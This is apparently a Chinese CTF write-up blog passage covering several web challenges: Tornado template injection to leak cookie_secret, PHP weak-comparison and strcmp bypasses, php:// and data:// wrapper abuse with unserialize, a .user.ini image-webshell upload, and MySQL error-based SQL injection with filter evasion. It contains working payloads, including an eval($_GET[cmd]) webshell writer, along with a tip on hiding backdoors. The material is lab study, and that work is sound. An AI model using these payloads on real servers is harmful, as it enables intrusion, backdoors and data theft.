class="hljs-symbol">request.args.mro</span>][<span class="hljs-string">-1</span>][<span class="hljs-symbol">request.args.subclasses</span>]()[<span class="hljs-string">127</span>][<span class="hljs-symbol">request.args.init</span>][<span class="hljs-string">request.args.globals</span>][<span class="hljs-symbol">request.args.popen</span>](request.args.cmd).read() &#125;&#125;</code></pre><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>flag in /fllllllllllllag</p><p>md5(cookie_secret+md5(filename))</p><p>针对报错界面的/error?msg=Error尝试模板注入</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220227211937496.png" alt="image-20220227211937496"></p><p>输入/error?msg=2，返回2</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220228210519796.png" alt="image-20220228210519796"></p><p>/error?msg=8，返回ORZ</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220228210447911.png" alt="image-20220228210447911"></p><p><code>/error?msg=&#123;&#123;4/2&#125;&#125;</code>，除和减也是返回ORZ，<code>/error?msg=&#123;&#123;*&#125;&#125;</code>、<code>/error?msg=&#123;&#123;_&#125;&#125;</code>也是返回ORZ，应该是过滤了特殊字符</p><h6 id="怎么找cookie-secret呢？"><a href="#怎么找cookie-secret呢？" class="headerlink" title="怎么找cookie_secret呢？"></a>怎么找cookie_secret呢？</h6><blockquote><p><a href="https://www.jianshu.com/p/c4070d6f4249">具体分析，源码</a></p></blockquote><p>查看wp发现<strong>用的就是handler.settings对象</strong></p><ol><li>什么是cookie_secret? <a href="https://tornado-zh.readthedocs.io/zh/latest/guide/security.html">tornado文档</a>里的部分源码：</li></ol><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainHandler</span>(<span class="hljs-params">BaseHandler</span>):</span><span class="hljs-meta">    @tornado.web.authenticated</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self</span>):</span>        name = tornado.escape.xhtml_escape(self.current_user)        self.write(<span class="hljs-string">&quot;Hello, &quot;</span> + name)settings = &#123;    <span class="hljs-string">&quot;cookie_secret&quot;</span>: <span class="hljs-string">&quot;__TODO:_GENERATE_YOUR_OWN_RANDOM_VALUE_HERE__&quot;</span>,    <span class="hljs-string">&quot;login_url&quot;</span>: <span class="hljs-string">&quot;/login&quot;</span>,&#125;application = tornado.web.Application([    (<span class="hljs-string">r&quot;/&quot;</span>, MainHandler),    (<span class="hljs-string">r&quot;/login&quot;</span>, LoginHandler),], **settings)</code></pre><p> settings中的属性”cookie_secret”（应该是一个经过HMAC加密的够长且随机的字节序列）</p><p>settings又作为参数传入了Application类构造函数</p><p><strong>因此可以通过<code>self.application.settings</code>获取到cookie_secret</strong></p><ol start="2"><li><p>RequestHandler类中的一个方法<strong>将RequestHandler类本身赋值给了handler</strong>，因此handler.settings实际上就是RequestHandler.settings（self.setting）【即<code>handler</code>就等于 <a href="https://links.jianshu.com/go?to=https://www.tornadoweb.org/en/latest/web.html%23tornado.web.RequestHandler"><code>RequestHandler</code></a> 】</p></li><li><p><code>RequestHandler.settings</code>别名 <code>self.application.settings</code></p></li><li><p>在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以<code>handler.settings</code>就指向RequestHandler.application.settings了，这里面就是我们的一些**<em>环境变量**</em></p></li></ol><p>==简单而言通过<code>&#123;&#123;handler.application.settings&#125;&#125;</code>或者<code>&#123;&#123;handler.settings&#125;&#125;</code>就可获得<code>settings</code>中的<strong>cookie_secret</strong>。==</p><p><code>/error?msg=&#123;&#123;handler.settings&#125;&#125;</code>得到cookie_secret:9d1f67f0-bb20-4878-a71e-16da5ce18c57</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220228211001182.png" alt="image-20220228211001182"></p><p>❗注意，这个与抓包里的cookie无关</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220228211146954.png" alt="image-20220228211146954"></p><p>计算filehash:md5(cookie_secret+md5(filename))</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$a=<span class="hljs-string">&#x27;9d1f67f0-bb20-4878-a71e-16da5ce18c57&#x27;</span>;$b=<span class="hljs-string">&#x27;/fllllllllllllag&#x27;</span>;<span class="hljs-comment">//echo $a.$b;</span><span class="hljs-keyword">echo</span> md5($a.md5($b));</code></pre><p>payload：</p><pre><code class="hljs sas">/<span class="hljs-meta">file</span>?<span class="hljs-meta">filename</span>=/fllllllllllllag<span class="hljs-variable">&amp;filehash</span>=f0c23d729e726f692178be3dda2f2b4b</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220228211604055.png" alt="image-20220228211604055"></p><h2 id="极客大挑战-2019-BuyFlag（易）"><a href="#极客大挑战-2019-BuyFlag（易）" class="headerlink" title="[极客大挑战 2019]BuyFlag（易）"></a>[极客大挑战 2019]BuyFlag（易）</h2><h4 id="考点：弱类型比较、绕过数据长度限制、strcmp"><a href="#考点：弱类型比较、绕过数据长度限制、strcmp" class="headerlink" title="考点：弱类型比较、绕过数据长度限制、strcmp"></a>考点：弱类型比较、绕过数据长度限制、strcmp</h4><p>点进菜单的payflag，提示:</p><pre><code class="hljs erlang-repl">If you want to buy the FLAG:You must be a student from CUIT!!!You must be answer the correct password!!!</code></pre><p>在源码里发现提示</p><pre><code class="hljs php">~~~post money <span class="hljs-keyword">and</span> password~~~<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;$password = $_POST[<span class="hljs-string">&#x27;password&#x27;</span>];<span class="hljs-keyword">if</span> (is_numeric($password)) &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;&#125;<span class="hljs-keyword">elseif</span> ($password == <span class="hljs-number">404</span>) &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Password Right!&lt;/br&gt;&quot;</span>;&#125;&#125;</code></pre><p>关于You must be a student from CUIT!!!，尝试修改referer不对，发现cookie：user=0，修改为CUIT也不对，修改为1，正确</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305161122799.png" alt="image-20220305161122799"></p><p>绕过password：</p><pre><code class="hljs erlang-repl">password=<span class="hljs-number">404</span>    ==》password can&#x27;t be numberpassword=<span class="hljs-string">&#x27;404&#x27;</span>  ==》Wrong Password!!   ==》给的是部分php源码password=<span class="hljs-number">404</span>a   ==》Password Right!Pay for the flag!!!hacker!!!</code></pre><p>根据Flag need your 100000000 money，猜测还有个参数money</p><pre><code class="hljs lsl">password=<span class="hljs-number">404</span>a&amp;<span class="hljs-section">money</span>=<span class="hljs-number">100000000</span>  ==》Password Right!&lt;/br&gt;Nember lenth is too long&lt;/br&gt;password=<span class="hljs-number">404</span>a&amp;<span class="hljs-section">money</span>=<span class="hljs-number">100</span>  ==&gt;&gt;Password Right!&lt;/br&gt;you have not enough <span class="hljs-section">money</span>,loser~&lt;/br&gt;用科学计数法,<span class="hljs-number">1e10</span>即<span class="hljs-number">1</span>*<span class="hljs-number">10</span>的<span class="hljs-number">10</span>次方，大于等于<span class="hljs-number">9</span>就能买了password=<span class="hljs-number">404</span>a&amp;<span class="hljs-section">money</span>=<span class="hljs-number">1e10</span>  ==&gt;&gt;Password Right!&lt;/br&gt;flag&#123;fb7ec519<span class="hljs-number">-90e9</span><span class="hljs-number">-47</span>d4<span class="hljs-number">-92</span>cf-ba9b204eeb54&#125;</code></pre><blockquote><p><strong>在</strong><a href="https://baike.baidu.com/item/%E7%A7%91%E5%AD%A6%E8%AE%A1%E6%95%B0%E6%B3%95">科学计数法</a><strong>中，为了使公式简便，可以用带“E”的格式表示。当用该格式表示时，E前面的数字和“E+”后面要精确到十分位，（位数不够末尾补0）,例如7.8乘10的7次方，正常写法为：7.8x10^7,简写为“7.8E+07”的形式</strong></p></blockquote><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305161955432.png" alt="image-20220305161955432"></p><p>更多方法：</p><p>绕numeric的：</p><blockquote><p><strong><em>is_numberic():就是判断括号里面的变量是不是数值</em></strong><br>漏洞绕过：is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。</p></blockquote><pre><code class="hljs angelscript">在后面加上%<span class="hljs-number">20</span>跳过：<span class="hljs-number">404</span>%<span class="hljs-number">20</span></code></pre><p>绕money的：<strong>长度有问题，应该是strcmp函数检测的</strong></p><blockquote><p>strcmp函数漏洞：strcmp比较的是字符串类型，如果强行传入其他类型参数，会出错，出错后返回值NULL，<strong>NULL==0</strong>，正是利用这点进行绕过</p></blockquote><pre><code class="hljs cpp">money[]可以绕开<span class="hljs-built_in">strcmp</span>函数</code></pre><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><h4 id="考点：flle-get-contents-、伪协议字符比较、反序列化echo-tostring"><a href="#考点：flle-get-contents-、伪协议字符比较、反序列化echo-tostring" class="headerlink" title="考点：flle_get_contents() 、伪协议字符比较、反序列化echo tostring"></a>考点：flle_get_contents() 、伪协议字符比较、反序列化echo tostring</h4><h4 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h4><ul><li><strong>条件</strong>：<ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp </code>需要on</li></ul></li></ul><p>php://filter用于读取源码，php://input用于执行php代码。</p><table><thead><tr><th>协议</th><th>作用</th></tr></thead><tbody><tr><td>php://input</td><td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，==在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。==</td></tr><tr><td>php://filter</td><td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，**类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>**，在数据流内容读取之前没有机会应用其他过滤器。</td></tr></tbody></table><pre><code class="hljs php">示例：http:<span class="hljs-comment">//127.0.0.1/include.php?file=php://input</span>[POST DATA部分]<span class="hljs-meta">&lt;?php</span> phpinfo(); <span class="hljs-meta">?&gt;</span>写入一句话：http:<span class="hljs-comment">//127.0.0.1/include.php?file=php://input</span>[POST DATA部分]<span class="hljs-meta">&lt;?php</span> fputs(fopen(<span class="hljs-string">&#x27;1juhua.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span></code></pre><h4 id="date"><a href="#date" class="headerlink" title="date://"></a>date://</h4><ul><li><p><strong>条件</strong>：</p><ul><li><p><code>allow_url_fopen</code>:on</p></li><li><p><code>allow_url_include</code> :on</p></li><li><p><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p></li><li><p>用法：</p></li></ul><pre><code class="hljs php">data:<span class="hljs-comment">//text/plain,</span>data:<span class="hljs-comment">//text/plain;base64,</span>http:<span class="hljs-comment">//127.0.0.1/include.php?file=data://text/plain,<span class="hljs-meta">&lt;?php</span>%20phpinfo();<span class="hljs-meta">?&gt;</span></span></code></pre></li></ul><h4 id="flle-get-contents"><a href="#flle-get-contents" class="headerlink" title="flle_get_contents()"></a>flle_get_contents()</h4><p>flle_get_contents() 函数,而这个函数是可以绕过的<br>绕过方式有多种:<br>●使用php://input伪协议绕过<br>    ①将要GET的参数?xxx=php://input<br>    ②用post方法传入想要file_get_contents() 函数返回的值<br>●用data://伪协议绕过<br>将url改为: ?xxx=data://text/plain;base64,想要 file_get_contents() 函数返回的值的base64编码<br>或者将url改为: ?xxx=data:text/plain,(url编码的内容)</p><p>==php://input和data://常在CTF里用来绕过一些判断语句;、file_get_contents()==</p><p><strong>总结：</strong></p><p>data://　　　　写入数据</p><p>php://input　　执行php</p><p>　　//filter　　查看源码</p><p>解题：index.php源码：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  $text = $_GET[<span class="hljs-string">&quot;text&quot;</span>];$file = $_GET[<span class="hljs-string">&quot;file&quot;</span>];$password = $_GET[<span class="hljs-string">&quot;password&quot;</span>];<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))&#123;  <span class="hljs-comment">//伪协议绕过</span>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/flag/&quot;</span>,$file))&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;        <span class="hljs-keyword">exit</span>();     &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">include</span>($file);  <span class="hljs-comment">//useless.php   通过伪协议filter读取文件源码</span>        $password = unserialize($password);  <span class="hljs-comment">//反序列化触发wake_up，这里并不是这个考点</span>        <span class="hljs-keyword">echo</span> $password;   <span class="hljs-comment">//echo对象会触发tostring</span>    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>用data://绕过file_get_contents，php://filter绕过include读取文件base64源码</p><pre><code class="hljs awk">?text=data:<span class="hljs-regexp">//</span>text<span class="hljs-regexp">/plain,welcome to the zjctf&amp;file=php:/</span><span class="hljs-regexp">/filter/</span>convert.base64-encode/resource=useless.php&amp;password=<span class="hljs-number">2</span></code></pre><p>读到useless.php源码：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span>    <span class="hljs-keyword">public</span> $file;      <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;   <span class="hljs-comment">//如果对象被当作字符串echo会触发这个方法</span>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;file))&#123;              <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file);             <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);        &#125;      &#125;  &#125;  <span class="hljs-meta">?&gt;</span></code></pre><p>password反序列化读flag.php，</p><p>payload:构造序列化脚本：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<span class="hljs-keyword">public</span> $file=<span class="hljs-string">&#x27;flag.php&#x27;</span>;&#125; $flag = <span class="hljs-keyword">new</span> Flag();$flag_1 = serialize($flag);<span class="hljs-keyword">echo</span> $flag_1;<span class="hljs-meta">?&gt;</span></code></pre><pre><code class="hljs pgsql">?<span class="hljs-type">text</span>=data://<span class="hljs-type">text</span>/plain,welcome <span class="hljs-keyword">to</span> the zjctf&amp;file=useless.php&amp;<span class="hljs-keyword">password</span>=O:<span class="hljs-number">4</span>:&quot;Flag&quot;:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:&quot;file&quot;;s:<span class="hljs-number">8</span>:&quot;flag.php&quot;;&#125;</code></pre><p>查看源码得到flag</p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220307210749077.png" alt="image-20220307210749077" style="zoom:80%;"><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><h4 id="考点：nginx的-user-ini、图片头"><a href="#考点：nginx的-user-ini、图片头" class="headerlink" title="考点：nginx的.user.ini、图片头"></a>考点：nginx的.user.ini、图片头</h4><p>关键点就是.user.ini与.htaccess的应用范围、.user.ini还需要同目录下存在一个可执行的php文件、上传图片马后url访问的不是图片地址，而是可执行php文件地址</p><blockquote><p><a href="https://xz.aliyun.com/t/6091">参考WP</a></p></blockquote><p>文件上传</p><ol><li><p>对后缀的过滤：php：不行，txt：可以，jpg：可以</p></li><li><p>上传图片马：发现过滤&lt;?，绕过:</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">php</span>&gt;</span>echo ‘123’;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></li><li><p>上传.htaccess也不行，必须是图片：改Content-Type: image/jpeg、后缀也不行（估计有图片头检验）</p></li></ol><p>​    然后加上图片头：<code>GIF89A</code>，发现没警告了，但是并不能解析成php</p><p><strong>原因在于本题服务器是nginx不是apache</strong>,（nginx要引用.htaccess也可以，但是还要进行某部分修改），这里显然不满足条件，所以没用。</p><h4 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h4><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/20190824211552-4c92f9fe-c671-1.png" alt="user.ini"></p><p>也就是说我们可以在.user.ini中设置php.ini中PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置，而且只要是在使用 CGI／FastCGI 模式的服务器上都可以使用.user.ini</p><p><strong>大致意思就是：我们指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php）</strong>，类似于在index.php中插入一句：require(./a.jpg);【<strong>类似.htaccess，只不过针对不同服务器</strong>】</p><ul><li><p>其中有两个配置，可以用来制造后门：<br>auto_append_file、auto_prepend_file<br>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数.而auto_append_file类似，只是在文件后面包含</p></li><li><p>用法：</p><p>直接写在.user.ini中：</p><pre><code class="hljs awk">auto_prepend_file=test.jpg 或auto_append_file=test.jpg（当文件调用的有<span class="hljs-keyword">exit</span>()时该设置无效）</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220307214829826.png" alt="image-20220307214829826"></p></li></ul><p>此时我们注意到上传目录下还有一个index.php，<strong>我们正好需要该目录下有一个可执行php文件</strong>，那这简直暴露了考点就是<code>.user.ini</code>，看来这个思路应该是可行的</p><p>上传<code>.user.ini</code>：</p><pre><code class="hljs routeros">GIF89a<span class="hljs-attribute">auto_prepend_file</span>=shell.jpg</code></pre><p>上传图片马：shell.jpg</p><pre><code class="hljs xml">GIF89a<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="javascript">system(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>==最后，访问index.php，注意是可执行的php而不是访问上传的图片马！==</p><pre><code class="hljs awk"><span class="hljs-regexp">/uploads/</span>cc551ab005b2e60fbdc88de809b2c4b1/index.php</code></pre><h4 id="user-ini实战利用的可能性"><a href="#user-ini实战利用的可能性" class="headerlink" title=".user.ini实战利用的可能性"></a>.user.ini实战利用的可能性</h4><p>综上所述<code>.user.ini</code>的利用条件如下：</p><ol><li>服务器脚本语言为PHP</li><li>服务器使用CGI／FastCGI模式</li><li>上传目录下要有可执行的php文件</li></ol><p><strong><em>从这来看<code>.user.ini</code>要比<code>.htaccess</code>的应用范围要广一些，毕竟<code>.htaccess</code>只能用于Apache</em></strong></p><p>但仔细推敲我们就会感到<strong>“上传目录下要有可执行的php文件”</strong>这个要求在文件上传中也比较苛刻，应该没有天才开发者会把上传文件放在主目录或者把php文件放在上传文件夹。</p><p>但也不是全无办法，如果我们根据实际情况配合其他漏洞使用可能会有奇效，前段时间我遇到一个CMS对上传时的路径没有检测<code>../</code>，因此导致文件可被上传至任意目录，这种情况下我们就很有可能可以利用<code>.user.ini</code></p><p>除此之外，把<code>.user.ini</code>利用在隐藏后门上应该是个很好的利用方法，我们在存在php文件的目录下留下<code>.user.ini</code>和我们的图片马，这样就达到了隐藏后门的目的。</p><h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><h4 id="考点：报错注入、空格-被过滤、截取部分字符串函数"><a href="#考点：报错注入、空格-被过滤、截取部分字符串函数" class="headerlink" title="考点：报错注入、空格=被过滤、截取部分字符串函数"></a>考点：报错注入、空格=被过滤、截取部分字符串函数</h4><p>关键点就是针对各种过滤，先利用burp爆破sql注入关键词字典，看哪些没有被过滤的，发现updatexml没有==&gt;报错注入，然后针对被过滤的关键词找替代绕过，=》like，空格》()，and》^，然后针对updatexml、extractvalue的缺陷：只能返回32位数据，利用字符串截取函数截取剩下部分flag</p><blockquote><p>参考：<a href="https://www.freebuf.com/articles/web/264593.html"><strong>MySQL注入绕过WAF的基础方式</strong></a></p><p><a href="https://xz.aliyun.com/t/7169#toc-30"><strong>对MYSQL注入相关内容及部分Trick、绕过的归类小结</strong></a></p></blockquote><p>用sql关键词字典爆破，线程数调低点，发现过滤了=、union、by、！、&amp;、|、*、空格【()、%0a绕过】、and、\、</p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220308210613847.png" alt="image-20220308210613847" style="zoom:67%;"><p><strong>但是！</strong>没有过滤<code>updatexml</code>、extractvalue==》尝试报错注入</p><p><img src="C:/Users/12456/AppData/Roaming/Typora/typora-user-images/image-20220308210814088.png" alt="image-20220308210814088"></p><pre><code class="hljs excel"><span class="hljs-built_in">and</span>、<span class="hljs-built_in">or</span>、&amp;&amp;、||被过滤——可用运算符! ^ ~以及<span class="hljs-built_in">not</span> <span class="hljs-built_in">xor</span>来代替空格被过滤——%<span class="hljs-number">09</span>, %<span class="hljs-number">0</span>a, %<span class="hljs-number">0</span>b, %<span class="hljs-number">0</span>c, %<span class="hljs-number">0</span>d, %<span class="hljs-symbol">a0</span>（等部分不可见字符可也代替空格）、<span class="hljs-built_in">and</span>/<span class="hljs-built_in">or</span>后面可以跟上偶数个!、~可以替代空格、改用+号、使用注释代替、多层括号嵌套= -&gt; like -&gt; regexp -&gt; &lt;&gt; -&gt; in</code></pre><h4 id="报错注入："><a href="#报错注入：" class="headerlink" title="报错注入："></a>报错注入：</h4><p>函数：</p><pre><code class="hljs apache"><span class="hljs-attribute">exp</span>(~(select * from(select user())a))<span class="hljs-attribute">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select user()),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)   //三个参数  <span class="hljs-number">0</span>x<span class="hljs-number">7</span>e:~<span class="hljs-attribute">and</span> (extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select user()),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e)))   //两个参数</code></pre><p>爆库名：</p><pre><code class="hljs sql">check.php?username=1&amp;password=&#x27;^(updatexml(1,concat(0x7e,(<span class="hljs-keyword">SELECT</span>(@@<span class="hljs-keyword">version</span>)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span>XPATH syntax <span class="hljs-keyword">error</span>: <span class="hljs-string">&#x27;~10.3.18-MariaDB~&#x27;</span>check.php?username=<span class="hljs-number">1</span>&amp;<span class="hljs-keyword">password</span>=<span class="hljs-string">&#x27;^(updatexml(1,concat(0x7e,(SELECT(database())),0x7e),1))%23</span><span class="hljs-string">或1&#x27;</span>^extractvalue(<span class="hljs-number">0x0a</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">database</span>()))))%<span class="hljs-number">23</span>XPATH syntax <span class="hljs-keyword">error</span>: <span class="hljs-string">&#x27;~geek~&#x27;</span></code></pre><p>爆表名：【注意select后一大串都需要括起来】</p><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=<span class="hljs-number">1</span>&amp;password=<span class="hljs-number">1</span>&#x27;^extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;))))%<span class="hljs-number">23</span><span class="hljs-attribute">XPATH</span> syntax error: &#x27;~H<span class="hljs-number">4</span>rDsq<span class="hljs-number">1</span>&#x27;</code></pre><p>爆列名：</p><pre><code class="hljs sql">username=1&amp;password=1&#x27;^extractvalue(1,concat(0x7e,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(column_name))<span class="hljs-keyword">from</span>(information_schema.columns)<span class="hljs-keyword">where</span>(table_schema)<span class="hljs-keyword">like</span>(<span class="hljs-string">&#x27;geek&#x27;</span>))))%<span class="hljs-number">23</span>XPATH syntax <span class="hljs-keyword">error</span>: <span class="hljs-string">&#x27;~id,username,password&#x27;</span></code></pre><p>爆字段：</p><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=<span class="hljs-number">1</span>&amp;password=<span class="hljs-number">1</span>&#x27;^extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select(group_concat(id,username,password))from(H<span class="hljs-number">4</span>rDsq<span class="hljs-number">1</span>))))%<span class="hljs-number">23</span><span class="hljs-attribute">XPATH</span> syntax error: &#x27;~<span class="hljs-number">1</span>flagflag&#123;<span class="hljs-number">1</span>f<span class="hljs-number">077763</span>-bd<span class="hljs-number">8</span>b-<span class="hljs-number">4</span>ef<span class="hljs-number">1</span>-<span class="hljs-number">92</span>&#x27;<span class="hljs-attribute">extractvalue</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select(group_concat(password))from(H<span class="hljs-number">4</span>rDsq<span class="hljs-number">1</span>))))%<span class="hljs-number">23</span>  //还是只回显一半，==》<span class="hljs-attribute">XPATH</span> syntax error: &#x27;~flag&#123;<span class="hljs-number">1</span>f<span class="hljs-number">077763</span>-bd<span class="hljs-number">8</span>b-<span class="hljs-number">4</span>ef<span class="hljs-number">1</span>-<span class="hljs-number">92</span>d<span class="hljs-number">9</span>-<span class="hljs-number">01</span>&#x27;</code></pre><p>**extractvalue()和updatexml()**只能回显==32位长度==的数据</p><p><strong>extractvalue()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用substring()函数截取，一次查看32位</strong></p><h4 id="截取部分长度字符串函数："><a href="#截取部分长度字符串函数：" class="headerlink" title="截取部分长度字符串函数："></a>截取部分长度字符串函数：</h4><table><thead><tr><th>lefft(str,len)</th><th>对指定字符串从最左边截取指定长度。</th></tr></thead><tbody><tr><td>right(str,len)</td><td>对指定字符串从<strong>最右边</strong>截取指定长度</td></tr><tr><td>substr(str,N_start,N_length)</td><td>对指定字符串进行截取，为SUBSTRING的简单版。</td></tr><tr><td>mid(column_name,start[,length])</td><td>str=”123456”   mid(str,2,1)  结果为2【类似string、substr】</td></tr></tbody></table><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;^extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select(right(password,<span class="hljs-number">15</span>))from(H<span class="hljs-number">4</span>rDsq<span class="hljs-number">1</span>))))%<span class="hljs-number">23</span><span class="hljs-attribute">XPATH</span> syntax error: &#x27;~<span class="hljs-number">9</span>-<span class="hljs-number">01</span>edbdbb<span class="hljs-number">1804</span>&#125;&#x27;</code></pre><p>拼接得到完整flag</p><h2 id="MRCTF2020-Ez-bypass（容易）"><a href="#MRCTF2020-Ez-bypass（容易）" class="headerlink" title="[MRCTF2020]Ez_bypass（容易）"></a>[MRCTF2020]Ez_bypass（容易）</h2><h4 id="考点：md5强比较绕过、弱比较"><a href="#考点：md5强比较绕过、弱比较" class="headerlink" title="考点：md5强比较绕过、弱比较"></a>考点：md5强比较绕过、弱比较</h4><pre><code class="hljs php">I put something in F12 <span class="hljs-keyword">for</span> you<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;$flag=<span class="hljs-string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;    $id=$_GET[<span class="hljs-string">&#x27;id&#x27;</span>];    $gg=$_GET[<span class="hljs-string">&#x27;gg&#x27;</span>];    <span class="hljs-keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;   <span 